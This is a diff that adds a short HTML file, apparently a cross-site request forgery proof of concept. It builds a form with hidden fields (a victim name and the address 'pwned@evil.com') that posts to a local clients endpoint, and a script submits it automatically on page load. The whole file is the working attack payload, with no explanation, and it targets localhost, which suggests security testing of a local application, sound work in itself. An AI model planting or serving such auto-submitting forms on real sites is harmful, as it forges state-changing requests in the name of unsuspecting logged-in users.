@@ -1,0 +1,6 @@
+<form action="http://localhost:8000/clients/form" method="POST">
+  <input type="hidden" name="name" value="Victima CSRF">
+  <input type="hidden" name="email" value="pwned@evil.com">
+  <input type="submit">
+</form>
+<script>document.forms[0].submit();</script>
